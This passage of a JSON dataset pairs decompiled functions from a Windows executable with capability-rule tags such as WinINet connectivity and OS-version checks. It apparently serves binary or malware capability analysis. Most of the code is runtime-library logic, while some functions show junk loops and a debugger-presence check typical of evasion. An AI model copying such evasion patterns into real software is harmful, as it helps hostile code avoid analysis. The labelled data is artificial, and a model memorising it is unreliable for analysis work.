        "decompiled_code": "\nuint __cdecl fcn.004017b7(uint *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint *puVar2;\n    uint uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        *arg_8h = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar1 = *(in_ECX + 0xaa8);\n        if (99 < uVar1) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            fcn.004037ce();\n            return 0;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.00405fec(in_ECX + 0x464 + uVar1 * 0x10, 3, *(in_ECX + 0x32), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        *arg_8h = **(in_ECX + 0x46c + uVar1 * 0x10);\n    }\n    return 1;\n}\n",
        "token_count": 298
    },
    "004017df": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004017df(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    in_ECX[1] = 0;\n    iVar1 = arg_8h;\n    if ((arg_8h != 2) && (arg_8h != 3)) {\n        iVar1 = 0;\n    }\n    *in_ECX = 0;\n    *(in_ECX + 1) = iVar1;\n    if (arg_8h == 1) {\n        iVar1 = fcn.0040493a(1);\n        *in_ECX = iVar1;\n        if (iVar1 == 0) {\n            *(in_ECX + 1) = 3;\n        }\n    }\n    return;\n}\n",
        "token_count": 175
    },
    "00401834": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00401834(uint *arg_8h, uint32_t arg_ch, uint32_t arg_10h, uint32_t arg_14h)\n\n{\n    int32_t in_ECX;\n    char *pcVar1;\n    \n    if ((((*(in_ECX + 0x28) == '\\0') && (arg_ch < 3)) && (arg_10h < 2)) && (arg_14h < 5)) {\n        pcVar1 = \"+v$x+v$xv$+xv+$xv$+x+$vx+$vx$v+x+$vx$+vx+v $+v $v $+v +$v $++$ v+$ v$ v++$ v$+ v+xv$+ v$v$ +v+ $v$ ++x$v+ $v$v ++ $v$ +v\"\n                 + ((arg_10h + arg_ch * 2) * 5 + arg_14h) * 4;\n    }\n    else {\n        pcVar1 = \"$+xv\";\n    }\n    *arg_8h = *pcVar1;\n    return;\n}\n",
        "token_count": 247
    },
    "00401843": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00401843(int32_t param_1)\n\n{\n    uint16_t uVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint16_t *puVar4;\n    int32_t in_stack_ffffffdc;\n    int32_t var_10h;\n    uint var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x571ca8 ^ &stack0xfffffffc;\n    if ((*(param_1 + 0x3c) == '\\0') || (*(param_1 + 0x38) < 1)) {\n        in_stack_ffffffdc = param_1 + 0xc;\n        fcn.0040549d(*(param_1 + 0x34), *(param_1 + 0x38), param_1 + 0x18);\n    }\n    else {\n        puVar4 = *(param_1 + 0x34);\n        iVar3 = 0;\n        do {\n            uVar1 = *puVar4;\n            puVar4 = puVar4 + 1;\n            var_10h = 0;\n            iVar2 = fcn.00401f78(&var_10h, &var_ch, 6, uVar1, *(param_1 + 8));\n            if ((iVar2 != 0) || (var_10h == 0)) {\n                *(param_1 + 0x18) = 0xffffffff;\n                break;\n            }\n            fcn.0040549d(&var_ch, var_10h, param_1 + 0x18);\n            iVar3 = iVar3 + 1;\n        } while (iVar3 != *(param_1 + 0x38));\n    }\n    fcn.004030bc(in_stack_ffffffdc);\n    return;\n}\n",
        "token_count": 398
    },
    "0040184d": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040184d(uint *param_1)\n\n{\n    code *pcVar1;\n    uint uVar2;\n    \n    if (*(param_1 + 1) == '\\0') {\n        return *param_1;\n    }\n    fcn.0040366b(L\"!_is_double\", L\"__crt_strtox::floating_point_value::as_float\", \n                 L\"minkernel\\\\crts\\\\ucrt\\\\inc\\\\corecrt_internal_strtox.h\", 0x1a5, 0);\n    pcVar1 = swi(3);\n    uVar2 = (*pcVar1)();\n    return uVar2;\n}\n",
        "token_count": 149
    },
    "00401884": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00401884(uint32_t *arg_8h)\n\n{\n    uint8_t uVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    int32_t in_ECX;\n    \n    if (*(in_ECX + 0x45c) == 1) {\n        *(in_ECX + 0x14) = *(in_ECX + 0x14) + 4;\n        uVar1 = *(*(in_ECX + 0x14) + -4);\n    }\n    else {\n        uVar3 = *(in_ECX + 0xaa8);\n        if (99 < uVar3) {\n            puVar2 = fcn.00403a35();\n            *puVar2 = 0x16;\n            uVar3 = fcn.004037ce();\n            return uVar3 & 0xffffff00;\n        }\n        if (*(in_ECX + 0x458) == 1) {\n            uVar3 = fcn.004028c4(in_ECX + 0x464 + uVar3 * 0x10, 1, *(in_ECX + 0x31), *(in_ECX + 0x2c));\n            return uVar3;\n        }\n        uVar1 = **(in_ECX + 0x46c + uVar3 * 0x10);\n    }\n    *arg_8h = uVar1;\n    arg_8h[1] = 0;\n    return 1;\n}\n",
        "token_count": 333
    },
    "0040188e": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint * __cdecl fcn.0040188e(uint *arg_8h, int32_t *arg_ch)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *puVar3;\n    uint unaff_EBX;\n    int32_t iVar4;\n    uint *in_stack_ffffffc4;\n    uint var_28h;\n    uint var_20h;\n    uint var_18h;\n    uint32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    if (**0x574458 == '\\0') {\n        if (*arg_ch != 0) {\n            var_18h = 0x555be4;\n            var_14h = 2;\n            fcn.00402eb4(&var_28h, 0x28, arg_ch);\n            fcn.00405164(&var_20h, &var_18h);\n            fcn.004062fd(&var_10h, 1);\n            puVar3 = &var_8h;\n            goto code_r0x0048d9ac;\n        }\n    }\n    else {\n        iVar1 = fcn.00403bf7();\n        if ((-1 < iVar1) && (iVar1 != 0)) {\n            var_8h = 0;\n            var_4h = 0;\n            iVar4 = iVar1;\n            if ((arg_ch[1] & 0x800U) == 0) goto code_r0x0048d8ce;\n            in_stack_ffffffc4 = &var_10h;\n            var_10h = 0x55513c;\n            var_ch = 2;\n            fcn.00405d71(in_stack_ffffffc4);\n            while (iVar4 = iVar1,  var_4h < '\\x02') {\ncode_r0x0048d8ce:\n                iVar1 = iVar4 + -1;\n                if ((iVar4 == 0) || (**0x574458 == '\\0')) break;\n                uVar2 = fcn.0040358a(&var_10h, 0);\n                fcn.00402eb4(&var_20h, 0x5b, uVar2);\n                in_stack_ffffffc4 = fcn.0040330f(&var_28h, 0x5d);\n                fcn.00402eeb(in_stack_ffffffc4);\n            }\n            if (*arg_ch != 0) {\n                if ((arg_ch[1] & 0x800U) == 0) {\n                    fcn.00402eb4(&var_28h, 0x28, arg_ch);\n                    fcn.0040330f(&var_20h, 0x29);\n                }\n                puVar3 = fcn.004053b7(in_stack_ffffffc4, unaff_EBX);\n                var_8h = *puVar3;\n                var_4h = puVar3[1];\n            }\n            fcn.00403693(&var_18h, &var_8h);\n            *arg_8h = var_18h;\n            arg_8h[1] = var_14h | 0x800;\n            return arg_8h;\n        }\n    }\n    var_8h = 0;\n    var_4h = 0;\n    fcn.00404557(0x5b);\n    fcn.004062fd(&var_28h, 1);\n    puVar3 = &var_20h;\ncode_r0x0048d9ac:\n    uVar2 = fcn.0040330f(puVar3, 0x5d);\n    fcn.00405c13(arg_8h, uVar2);\n    return arg_8h;\n}\n",
        "token_count": 852
    },
    "00401898": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401898(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    uint uVar3;\n    int32_t *piVar4;\n    int32_t in_ECX;\n    uint32_t var_4h;\n    \n    piVar2 = *(in_ECX + 0xc);\n    if (piVar2 == NULL) {\n        piVar2 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar2;\n    }\n    iVar1 = *piVar2;\n    *piVar2 = 0;\n    var_4h = 0;\n    uVar3 = fcn.00404999(*(in_ECX + 0x10) + -1, &var_4h, 10);\n    *arg_8h = uVar3;\n    piVar4 = *(in_ECX + 0xc);\n    if (piVar4 == NULL) {\n        piVar4 = fcn.00403a35();\n        *(in_ECX + 0xc) = piVar4;\n    }\n    if ((*piVar4 == 0x22) || (var_4h < *(in_ECX + 0x10))) {\n        uVar3 = 0;\n    }\n    else {\n        *(in_ECX + 0x10) = var_4h;\n        uVar3 = 1;\n    }\n    if ((*piVar2 == 0) && (iVar1 != 0)) {\n        *piVar2 = iVar1;\n    }\n    return uVar3;\n}\n",
        "token_count": 354
    },
    "00401901": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401901(int32_t arg_8h)\n\n{\n    int32_t iStack40;\n    int32_t iStack36;\n    \n    iStack36 = 0x1b;\n    while (0 < iStack36) {\n        arg_8h = iStack36 + -1;\n        iStack36 = arg_8h;\n    }\n    iStack40 = 0x12;\n    while (0 < iStack40) {\n        arg_8h = iStack40 + -1;\n        iStack40 = arg_8h;\n    }\n    return arg_8h;\n}\n",
        "token_count": 137
    },
    "0040191a": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nfloat10 __cdecl fcn.0040191a(uint arg_8h, uint arg_ch, int32_t arg_10h, uint *arg_14h)\n\n{\n    uint uVar1;\n    uint *puVar2;\n    float10 fVar3;\n    float fStack8;\n    \n    puVar2 = fcn.00403a35();\n    uVar1 = *puVar2;\n    *puVar2 = 0;\n    fVar3 = fcn.00406460(arg_8h, arg_ch);\n    *arg_14h = *puVar2;\n    *puVar2 = uVar1;\n    fStack8 = fVar3;\n    if (arg_10h != 0) {\n        fVar3 = fcn.00402c9d(arg_10h);\n        fStack8 = fVar3 * fStack8;\n    }\n    return fStack8;\n}\n",
        "token_count": 199
    },
    "0041ef00": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041ef00(int32_t arg_8h)\n\n{\n    uint in_ECX;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    fcn.00403904();\n    if (arg_8h != 0) {\n        fcn.00401ebf(in_ECX);\n    }\n    return in_ECX;\n}\n",
        "token_count": 94
    },
    "00401956": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401956(uint arg_8h)\n\n{\n    int32_t **in_FS_OFFSET;\n    int32_t iStack116;\n    int32_t *piStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_ch;\n    \n    uStack28 = 0x451220;\n    piStack32 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack32;\n    uStack24 = 0;\n    fcn.00401e79(\"gvbiozdbtheiynxrzztvrismfudtvyinudqevndf\");\n    for (iStack116 = 0x21; 0 < iStack116; iStack116 = iStack116 + -1) {\n    }\n    uStack24 = 1;\n    fcn.00401e79(\"pdifttj\");\n    fcn.00403b02();\n    fcn.00403b02();\n    *in_FS_OFFSET = piStack32;\n    return arg_8h;\n}\n",
        "token_count": 253
    },
    "0040196f": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040196f(uint noname_0, int32_t arg_ch)\n\n{\n    int32_t arg_10h;\n    uint uVar1;\n    int32_t in_ECX;\n    \n    arg_10h = in_ECX + 0x2c;\n    if (*(in_ECX + 0x28) == '\\0') {\n        uVar1 = *(arg_ch + 0x10);\n    }\n    else {\n        uVar1 = *(arg_ch + 0xc);\n    }\n    uVar1 = fcn.00401cc1(uVar1, 0, arg_10h);\n    *(in_ECX + 0x10) = uVar1;\n    uVar1 = 0x552647;\n    if (*(arg_ch + 0x2e) < 5) {\n        uVar1 = *(arg_ch + 0x20);\n    }\n    uVar1 = fcn.00401cc1(uVar1, 0, arg_10h);\n    *(in_ECX + 0x14) = uVar1;\n    uVar1 = 0x554974;\n    if (*(arg_ch + 0x2f) < 5) {\n        uVar1 = *(arg_ch + 0x24);\n    }\n    uVar1 = fcn.00401cc1(uVar1, 0, arg_10h);\n    *(in_ECX + 0x18) = uVar1;\n    *(in_ECX + 0xc) = **(arg_ch + 0x14);\n    *(in_ECX + 0xd) = **(arg_ch + 0x18);\n    return;\n}\n",
        "token_count": 369
    },
    "00401997": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401997(uint arg_8h)\n\n{\n    int32_t iStack60;\n    int32_t iStack56;\n    int32_t iStack52;\n    \n    for (iStack52 = 0x49; 0 < iStack52; iStack52 = iStack52 + -1) {\n    }\n    for (iStack56 = 0x60; 0 < iStack56; iStack56 = iStack56 + -1) {\n    }\n    for (iStack60 = 0x3a; 0 < iStack60; iStack60 = iStack60 + -1) {\n    }\n    return 0x3d97;\n}\n",
        "token_count": 152
    },
    "004019ba": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004019ba(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    for (iVar2 = 99; 0 < iVar2; iVar2 = iVar2 + -1) {\n    }\n    for (iVar1 = 0x3e; 0 < iVar1; iVar1 = iVar1 + -1) {\n    }\n    fcn.00403b02(&arg_8h, &stack0x00000024, iVar1, iVar2, *0x546c48);\n    fcn.00403b02();\n    return;\n}\n",
        "token_count": 137
    },
    "00401a32": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00401a32(int32_t arg_8h, uint arg_ch, uint32_t arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint arg_8h_00;\n    \n    iVar2 = (*_sym.imp.KERNEL32.dll_IsDebuggerPresent)();\n    if (iVar2 != 0) {\n        if (arg_8h != 0) {\n            (*_sym.imp.KERNEL32.dll_OutputDebugStringW)(arg_8h);\n        }\n        iVar3 = fcn.00401adc();\n        if (iVar3 != 1) {\n            return 4;\n        }\n    }\n    iVar3 = fcn.00404c14();\n    if ((iVar3 == 2) && (cVar1 = fcn.00402e5a(),  cVar1 != '\\0')) {\n        cVar1 = fcn.00404dd6();\n        if (cVar1 == '\\0') {\n            arg_10h = arg_10h | 0x200000;\n            arg_8h_00 = 0;\n        }\n        else {\n            arg_8h_00 = fcn.00401a96();\n        }\n        iVar2 = fcn.00404dbd(arg_8h_00, arg_8h, arg_ch, arg_10h);\n        return iVar2;\n    }\n    return (iVar2 != 0) + 3;\n}\n",
        "token_count": 325
    },
    "00401a64": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: var_13h\n// WARNING: Variable defined which should be unmapped: var_30h\n// WARNING: Variable defined which should be unmapped: var_2ch\n\nvoid __cdecl fcn.00401a64(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, uint arg_1ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    uchar uVar3;\n    char cVar4;\n    int32_t *piVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    char *pcVar9;\n    uchar *puVar10;\n    int32_t unaff_EBP;\n    uint8_t uVar11;\n    uint32_t uVar12;\n    int32_t iVar13;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_5ch;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_13h;\n    uint var_4h;\n    \n    fcn.00405434(0x6c);\n    iVar8 = *(unaff_EBP + 0x10);\n    *(unaff_EBP + -0x74) = *(unaff_EBP + 0xc);\n    *(unaff_EBP + -0x6c) = *(unaff_EBP + 0x14);\n    *(unaff_EBP + -100) = *(unaff_EBP + 0x1c);\n    piVar5 = fcn.00406433(*(unaff_EBP + 0x1c));\n    pcVar2 = *(*piVar5 + 0x14);\n    (**0x578000)(unaff_EBP + -0x5c);\n    (*pcVar2)();\n    *(unaff_EBP + -4) = 0;\n    if (*(unaff_EBP + -0x4c) == 0) {\n        *(unaff_EBP + -0x5e) = 0;\n    }\n    else {\n        uVar3 = fcn.0040596b();\n        *(unaff_EBP + -0x5e) = uVar3;\n    }\n    piVar5 = fcn.00403616(*(unaff_EBP + -100));\n    pcVar2 = *(*piVar5 + 0x1c);\n    (**0x578000)(0x553de4, 0x553dff, unaff_EBP + -0x2c);\n    (*pcVar2)();\n    puVar10 = *(unaff_EBP + -0x74);\n    *(unaff_EBP + -0x68) = puVar10;\n    cVar4 = fcn.00404011(*(unaff_EBP + -0x6c));\n    if (cVar4 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar4 = *(iVar8 + 5);\n        if (cVar4 == *(unaff_EBP + -0x15)) {\n            *puVar10 = 0x2b;\n        }\n        else {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.004019e7();\n                cVar4 = *(iVar8 + 5);\n            }\n            if (cVar4 != *(unaff_EBP + -0x16)) goto code_r0x00467d3e;\n            *puVar10 = 0x2d;\n        }\n        *(unaff_EBP + -0x68) = puVar10 + 1;\n        fcn.00401c7b();\n    }\ncode_r0x00467d3e:\n    uVar12 = *(unaff_EBP + 0x18) & 0xe00;\n    *(unaff_EBP + -100) = 10;\n    if (uVar12 == 0x400) {\n        uVar11 = 8;\n    }\n    else if (uVar12 == 0x800) {\n        uVar11 = 0x10;\n    }\n    else {\n        uVar11 = -(uVar12 != 0) & 10;\n    }\n    *(unaff_EBP + -0x5f) = 0;\n    cVar4 = fcn.00404011(*(unaff_EBP + -0x6c));\n    if (cVar4 == '\\0') {\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        if (*(iVar8 + 5) != *(unaff_EBP + -0x2c)) goto code_r0x00467e02;\n        *(unaff_EBP + -0x5d) = 1;\n        *(unaff_EBP + -0x70) = 1;\n        fcn.00401c7b();\n        cVar4 = fcn.00404011(*(unaff_EBP + -0x6c));\n        if (cVar4 != '\\0') {\ncode_r0x00467df9:\n            if (uVar11 == 0) {\n                uVar11 = 8;\n                goto code_r0x00467e12;\n            }\n            goto code_r0x00467e0e;\n        }\n        if (*(iVar8 + 4) == '\\0') {\n            fcn.004019e7();\n        }\n        cVar4 = *(iVar8 + 5);\n        if (cVar4 != *(unaff_EBP + -0x13)) {\n            if (*(iVar8 + 4) == '\\0') {\n                fcn.004019e7();\n                cVar4 = *(iVar8 + 5);\n            }\n            if (cVar4 != *(unaff_EBP + -0x14)) goto code_r0x00467df9;\n        }\n        if ((uVar11 != 0) && (uVar11 != 0x10)) goto code_r0x00467e0e;\n        uVar11 = 0x10;\n        *(unaff_EBP + -0x5d) = 0;\n        *(unaff_EBP + -0x70) = 0;\n        fcn.00401c7b();\ncode_r0x00467e12:\n        *(unaff_EBP + -100) = ((uVar11 != 8) - 1 & 0xfffffff2) + 0x16;\n    }\n    else {\ncode_r0x00467e02:\n        *(unaff_EBP + -0x5d) = 0;\n        *(unaff_EBP + -0x70) = 0;\n        if (uVar11 != 0) {\ncode_r0x00467e0e:\n            if (uVar11 != 10) goto code_r0x00467e12;\n        }\n    }\n    fcn.0040375b(1, *(unaff_EBP + -0x70));\n    *(unaff_EBP + -4) = 1;\n    iVar13 = 0;\n    *(unaff_EBP + -0x70) = *(unaff_EBP + -0x74) + 0x1f;\n    uVar12 = fcn.00404011(*(unaff_EBP + -0x6c));\n    if (uVar12 == '\\0') {\n        do {\n            if (*(iVar8 + 4) == '\\0') {\n                uVar12 = fcn.004019e7();\n            }\n            uVar12 = uVar12 & 0xffffff00 | *(iVar8 + 5);\n            *(unaff_EBP + -0x78) = uVar12;\n            uVar12 = fcn.00402851(unaff_EBP + -0x2c, uVar12);\n            if (uVar12 < *(unaff_EBP + -100)) {\n                cVar1 = *(unaff_EBP + -0x5f);\n                cVar4 = *(uVar12 + 0x553de4);\n                pcVar9 = *(unaff_EBP + -0x68);\n                *pcVar9 = cVar4;\n                if (((cVar1 != '\\0') || (cVar4 != '0')) && (pcVar9 < *(unaff_EBP + -0x70))) {\n                    *(unaff_EBP + -0x5f) = 1;\n                    *(unaff_EBP + -0x68) = pcVar9 + 1;\n                }\n                iVar6 = unaff_EBP + -0x44;\n                *(unaff_EBP + -0x5d) = 1;\n                if (0xf < *(unaff_EBP + -0x30)) {\n                    iVar6 = *(unaff_EBP + -0x44);\n                }\n                if (*(iVar6 + iVar13) != '\\x7f') {\n                    iVar6 = unaff_EBP + -0x44;\n                    if (0xf < *(unaff_EBP + -0x30)) {\n                        iVar6 = *(unaff_EBP + -0x44);\n                    }\n                    *(iVar6 + iVar13) = *(iVar6 + iVar13) + '\\x01';\n                }\n            }\n            else {\n                uVar12 = *(unaff_EBP + -0x30);\n                iVar6 = *(unaff_EBP + -0x44);\n                iVar7 = unaff_EBP + -0x44;\n                if (0xf < uVar12) {\n                    iVar7 = iVar6;\n                }\n                if ((*(iVar7 + iVar13) == '\\0') || (*(unaff_EBP + -0x5e) == '\\0')) goto code_r0x00467f2c;\n                if (*(iVar8 + 4) == '\\0') {\n                    fcn.004019e7();\n                    cVar4 = *(iVar8 + 5);\n                    uVar12 = *(unaff_EBP + -0x30);\n                    iVar6 = *(unaff_EBP + -0x44);\n                }\n                else {\n                    cVar4 = *(unaff_EBP + -0x78);\n                }\n                if (cVar4 != *(unaff_EBP + -0x5e)) goto code_r0x00467f2c;\n                fcn.00404543(0);\n                iVar13 = iVar13 + 1;\n            }\n            fcn.00401c7b();\n            uVar12 = fcn.00404011(*(unaff_EBP + -0x6c));\n        } while (uVar12 == '\\0');\n        uVar12 = *(unaff_EBP + -0x30);\n        iVar6 = *(unaff_EBP + -0x44);\ncode_r0x00467f2c:\n        if (iVar13 != 0) {\n            iVar8 = unaff_EBP + -0x44;\n            if (0xf < uVar12) {\n                iVar8 = iVar6;\n            }\n            if (*(iVar8 + iVar13) < '\\x01') {\n                cVar4 = '\\0';\n                goto code_r0x00467f50;\n            }\n            iVar13 = iVar13 + 1;\n        }\n    }\n    else {\n        uVar12 = *(unaff_EBP + -0x30);\n        iVar6 = *(unaff_EBP + -0x44);\n    }\n    cVar4 = *(unaff_EBP + -0x5d);\ncode_r0x00467f50:\n    pcVar9 = unaff_EBP + -0x5c;\n    if (0xf < *(unaff_EBP + -0x48)) {\n        pcVar9 = *(unaff_EBP + -0x5c);\n    }\n    if (cVar4 == '\\0') {\ncode_r0x00467fc4:\n        puVar10 = *(unaff_EBP + -0x74);\n    }\n    else {\n        while ((iVar13 != 0 && (cVar4 = *pcVar9,  cVar4 != '\\x7f'))) {\n            iVar13 = iVar13 + -1;\n            if (iVar13 != 0) {\n                *(unaff_EBP + -100) = unaff_EBP + -0x44;\n                if (0xf < uVar12) {\n                    uVar12 = *(unaff_EBP + -0x30);\n                    *(unaff_EBP + -100) = *(unaff_EBP + -0x44);\n                }\n                iVar6 = *(unaff_EBP + -0x44);\n                if (cVar4 != *(*(unaff_EBP + -100) + iVar13)) goto code_r0x00467fc4;\n            }\n            if (iVar13 == 0) {\n                *(unaff_EBP + -100) = unaff_EBP + -0x44;\n                if (0xf < *(unaff_EBP + -0x30)) {\n                    *(unaff_EBP + -100) = iVar6;\n                }\n                uVar12 = *(unaff_EBP + -0x30);\n                if (cVar4 < **(unaff_EBP + -100)) goto code_r0x00467fc4;\n            }\n            if ('\\0' < pcVar9[1]) {\n                pcVar9 = pcVar9 + 1;\n            }\n        }\n        puVar10 = *(unaff_EBP + -0x68);\n        if (*(unaff_EBP + -0x5f) == '\\0') {\n            *puVar10 = 0x30;\n            puVar10 = puVar10 + 1;\n        }\n    }\n    *puVar10 = 0;\n    fcn.00402a0e();\n    fcn.00402a0e();\n    fcn.004068fc();\n    return;\n}\n",
        "token_count": 3095
    },
    "00401a69": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
